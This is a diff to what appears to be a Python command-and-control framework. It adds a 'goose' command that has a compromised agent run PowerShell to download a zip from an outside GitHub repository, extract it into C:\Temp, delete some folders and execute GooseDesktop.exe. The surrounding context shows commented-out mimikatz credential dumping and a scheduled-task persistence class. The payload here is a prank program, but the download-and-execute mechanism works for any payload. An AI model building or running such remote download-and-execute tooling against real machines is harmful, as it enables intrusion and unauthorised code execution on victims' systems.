@@ -485,3 +485,37 @@ class ScheduledTaskPingPersistence(BaseCommand):
 #         else:
 #             print("Credential dumping executed. Check stored output for credentials.")
 #             self.agent_class.store_response(mimikatz_id, mimikatz_resp)
+
+
+######################################
+# 9. Fun - DesktopGoose
+######################################
+class DesktopGoose(BaseCommand):
+    command_name = "goose"
+    command_help = "\tUsage: `goose`\n" "\tDownloads & runs desktop goose\n"
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.target_host = args_list[0]
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            download_goose = "shell powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/ryanq47/DakotaConquestPayloads/archive/refs/heads/main.zip' -OutFile 'C:\Temp\\archive.zip'; Expand-Archive -Path 'C:\Temp\\archive.zip' -DestinationPath 'C:\Temp'; rm C:\Temp\\archive.zip; mv C:\Temp\DakotaConquestPayloads-main C:\Temp\somefolder\""
+            remove_1 = "shell powershell -c 'rm C:\Temp\somefolder\Linux -r'"
+            remove_2 = "shell powershell -c 'rm C:\Temp\somefolder\Python -r'"
+            remove_3 = "shell powershell -c 'rm C:\Temp\somefolder\Windows -r'"
+
+            run_goose = "shell C:\Temp\somefolder\goose\GooseDesktop.exe"
+
+            # Enqueue the command to create the task
+            self.agent_class.enqueue_command("execution_mode sync")
+            self.agent_class.enqueue_command(download_goose)
+            self.agent_class.enqueue_command("execution_mode async")
+            self.agent_class.enqueue_command(remove_1)
+            self.agent_class.enqueue_command(remove_2)
+            self.agent_class.enqueue_command(remove_3)
+            self.agent_class.enqueue_command(run_goose)
+
+        except Exception as e:
+            print("ScheduledTaskPingPersistence encountered an error:", e)
